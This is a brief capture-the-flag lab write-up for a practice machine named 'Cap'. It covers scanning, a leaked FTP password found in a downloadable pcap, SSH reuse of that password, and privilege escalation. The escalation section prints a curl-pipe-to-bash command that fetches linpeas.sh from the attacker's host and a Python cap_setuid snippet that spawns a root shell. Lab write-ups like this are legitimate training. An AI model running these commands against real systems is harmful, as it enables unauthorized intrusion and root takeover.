# CAP

## 🧾 Basic Info

- **Machine Name**: Cap
- **IP Address**: 10.10.10.245
- **Date**: 27/07/2025
- **Difficulty**: Easy
- **Your Username**: Marwk

---

## 🔎 Step 1: Scanning

### Nmap Scan

**Open Ports:**
- Port: 21, 22, 80
- Service: FTP, SSH, gunicorn(webserver)

---

## 🌐 Step 2: Enumeration

- we can download the output of netstat scan done on the host
- going to /data/0 reveals previous scan
- after downloading the pcap file and going through it we can find the user Nathans password for the ftp server

---

## 🔓 Step 3: Getting In (Initial Access)

- we also find that the password found above can also be used to login to SSH
- here we can find the user flag in the user's desktop

---

## 🔼 Step 4: Privilege Escalation

- we use linPEAS for privilege escalation 
- we host a http server on our VM where linpeas.sh is contained
- then we can just curl the contents of linpeas.sh onto the host and pipe it into bash
$curl http://10.10.16.19/linpeas.sh | bash
- in the linpeas output we see that the /usr/bin/python3.8 has cap_setuid. this can allow us to set our uid to 0, that is root.
-by running the following in /usr/bin/python3.8 we can access the root terminal:
import os
os.setuid(0)
os.system("/bin/bash")

---

## 🧠 Notes / What You Learned

Overall the machine was Easy but i had to refer to the official writeup for most parts like:
- going to /data/0
- using the password for ssh
- using linpeas
- using the python misconfiguration

---

## 🧰 Tools You Used

- Nmap
- LinPEAS
- WireShark